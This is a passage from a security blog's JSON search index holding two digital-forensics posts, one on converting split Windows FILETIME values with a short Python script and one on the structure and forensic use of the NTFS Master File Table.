typedef struct _filetime { dword dwlowdatetime; dword dwhighdatetime; } filetime, *pfiletime, *lpfiletime; here, the dwlowdatetime is the low-order and the dwhighdatetime is the high-order part of the file time.\nolder compilers did not have support for 64 bit types. so the structure splits the 64 bit value into two 32 bit parts. the low part contains the least significant 32 bits. the high part contains the most significant 32 bits.\nconverting filetime to human readable format to convert the filetime into human readable format we need a unsigned 64 bit integer union. but 64 bit integer support may vary compiler to compiler based on cpu architecture and os versions. microsoft\u0026rsquo;s official documentation says it supports ularge_integer (unsigned 64 bit integer union) from windows 10 build 20348.\ntypedef union _ularge_integer { struct { dword lowpart; dword highpart; } dummystructname; struct { dword lowpart; dword highpart; } u; ulonglong quadpart; } ularge_integer; the ularge_integer structure is actually a union. if your compiler has built-in support for 64-bit integers, use the quadpart member to store the 64-bit integer. otherwise, use the lowpart and highpart members to store the 64-bit integer.\nso, many softwares uses the lowpart and highpart to store a unsigned 64 bit integer by splitting it into 32 bit each. for example notepad++ uses originalfilelastmodiftimestamp as lowpart and originalfilelastmodiftimestamphigh as highpart to store the filetime timestamps.\nto retrieve a human readable date/time from these two parts needs some arithmatic operations.\na simplest way to get the original filetime timestamp from lowpart and highpart is a by using the following formula.\nlowpart + 2^32 * highpart the formula does not provide a good enough precision. meaning the retrieved value may have some deviations of minutes and seconds.\nto retrive the precise date/time value we need to perform some bitwise operation on the lowpart and highpart in python to convert it into it\u0026rsquo;s original form (a 64 bit unsigned integer).\na filetime timestamp is a number in 100-nanosecond intervals that have elapsed since 12:00 a.m. january 1, 1601 coordinated universal time (utc) till the creation time of the timestamp. to get the creation time, we need to add it to the nanosecond value of the initial date (1601-01-01).\nps: we can convert the timestamp\u0026rsquo;s value to millisecond or second also. the retrived date/time will be in utc, as the initial value is in utc.\nhere\u0026rsquo;s a simple python script to convert splitted filetime timestamp to human readable format.\nimport datetime timestamp_low = -1354503710 timestamp_high = 31047188 full_timestamp = (timestamp_high \u0026lt;\u0026lt; 32) | (timestamp_low \u0026amp; 0xffffffff) print(full_timestamp) timestamp_seconds = full_timestamp / 10**7 print(timestamp_seconds) converted_date_from_file_time = datetime.datetime(1601, 1, 1) + datetime.timedelta(seconds=timestamp_seconds) print(converted_date_from_file_time) references file times ularge_integer union filetime structure what is dwlowdatetime and dwhighdatetime how to create filetime in win32? htb discussion board ldap, active directory \u0026amp; filetime timestamp converter ","title":"Filetime"},{"date":"2024-05-16","image":"","imageAlt":"","link":"https://hshakilst.github.io/posts/master-file-table/","summary":"What is a Master File Table? The Master File Table (MFT) is a system file in the NTFS file system (having the name $MFT) that stores metadata information about all files and directories on an NTFS volume.","tags":["dfir","file","master","table","windows"],"text":"what is a master file table? the master file table (mft) is a system file in the ntfs file system (having the name $mft) that stores metadata information about all files and directories on an ntfs volume. the mft acts as an index to all the files and directories on the volume, providing quick access to the information needed to retrieve a file.\neach file and directory on an ntfs volume has a unique record in the mft, known as an mft entry. the mft entry contains information such as the file name, timestamps, permissions, and a pointer to the fileâs data. the corresponding mft entry is updated when a file is created or modified.\nwhen a file is deleted, the corresponding mft entry is marked as free, but the actual file data remains on the disk until it is overwritten by new data. this can be useful in data recovery scenarios, as the deleted fileâs data may still be recoverable. successful data recovery requires that the disk regions occupied by the deleted data are not overwritten.\nnote: the mft is stored on the ntfs volume and is an important component of the ntfs file system. the mft must remain intact and undamaged for the file system to function properly.\nwhy is the mft useful for forensics? comprehensive data storage: the mft provides a detailed record of each file, including timestamps, permissions, and data content locations, making it invaluable for forensic investigations.\nrecovery of deleted files: even when files are deleted, their mft entries might not be immediately reused. this allows forensic analysts to recover details about the deleted files, which can be crucial in legal contexts.\ntracking file modifications: the mft includes multiple timestamps that record different types of file access and modifications. this can help construct a timeline of activities on a system, an essential aspect of forensic analysis.\ndetecting malware and unauthorized access: since the mft records file creation and modification details, unusual changes detected in these entries can indicate unauthorised access or malware activity.\ngeneral structure of mft record the structure of the master file table (mft) in the ntfs file system is complex and consists of multiple records, each of which represents a file or directory on the ntfs volume. each mft record is 1024 bytes, making the mft very simple to parse. an mft record has the following general structure:\nfile record header: this section contains information about the record itself, including the size of the record, the offset of the update sequence, and the flags that indicate the state of the file or directory.\nfile attribute list: this section contains a list of attributes that describe the file or directory, including its name, timestamps, size, and data. each attribute is stored as a separate structure with its format.\ndata runs: this section describes the location of the file or directoryâs data on the disk. the data runs are stored as a series of extents describing the starting cluster and the length of each contiguous data block.\nthe exact format and structure of the mft in ntfs can vary depending on the version of the file system in use. however, the general structure remains the same, with the file record header, file attribute list, and data runs being the main components of each mft entry.\nnote: itâs important to note that accessing the mft directly can be dangerous and potentially lead to file system corruption or data loss. before attempting to access or modify the mft, itâs recommended to perform operations on a backup of the mft or back up important data beforehand.\ndetailed breakdown of mft fields $standard_information\ncreation time: the date and time when the file or directory was created. modification time: the date and time when the file or directory was last modified. access time: the date and time when the file or directory was last accessed. entry modified time: the date and time when the mft entry itself was last modified. use case: these timestamps are vital for timeline analysis to determine the sequence of user actions and file usage. $file_name\nfile name: the name of the file or directory. parent directory: the mft record number of the directory in which the file resides. additional timestamps: similar to $standard_information, but specific to this attribute and sometimes used as a fallback. use case: this attribute is used to confirm the integrity of file paths and names in the system, which is crucial for tracking user movements and detecting unauthorised changes. $data\nactual data or pointer: either the data itself for smaller files or a pointer to the data for larger files. use case: direct analysis of file contents and data recovery, especially important in cases involving data theft or unauthorized data manipulation. $logged_utility_stream\ntransactional data: holds data related to transactional ntfs (txf), which logs temporary file state changes. use case: can be used to track changes made during a transaction, useful in cases of system crashes or unexpected shutdowns to determine interim states. $bitmap\ncluster allocation: maps which clusters are in use by the file. use case: useful for recovering deleted files or reconstructing file data from clusters not overwritten by new data. $security_descriptor\nowner id: identifies who owns the file. permissions: details what permissions are attached to the file (who can read, write, execute, etc.). audit settings: specifies what operations (like access or changes) are logged by the system. use case: critical for determining access rights and detecting potential security breaches where permissions may have been altered. $volume_information (specific to the mft entry for the volume itself)\nvolume serial number: unique identifier for the volume. flags: system flags related to the volume, such as whether itâs dirty (improperly unmounted). use case: useful in multi-disk systems to link files and activities to specific volumes, essential in systems recovery and forensic analysis across multiple drives. $index_root and $index_allocation\nindex entries: used in directories to index contained files for quick access. use case: forensically important for reconstructing directory structures and understanding how data was organized and accessed, particularly in complex investigations involving numerous files and directories. timestamps created (0x10) is the standard information (si) creation timestamp. this can be modified by user level processes, for example, timestomping. created (0x30) is the filename (fn) creation timestamp.\ntimestamps of (fn) - behave differently from timestamps of (si). these values don\u0026rsquo;t change or all of the values change at once. however, rename and moved in a local volume are exceptions. these processes are inherited from (si) value then set corresponding (fn) value. for more ntfs timestamps.\nmft resident files files that can be stored directly within the master file table (mft) known as resident files. the size of this kind of files varies depending on the file, the system, and the amount of metadata stored in the mft.\ngenerally, the more metadata associated with a file, the less space remains for storing the file\u0026rsquo;s data itself within the mft. while there is no strict upper limit, typically files smaller than approximately 900 bytes can be fully contained within their mft record.\nreferences geeksforgeeks kazamiya official writeup bft by cyberjunkie \u0026amp; sebh24 on htb ","title":"Master File Table"}]}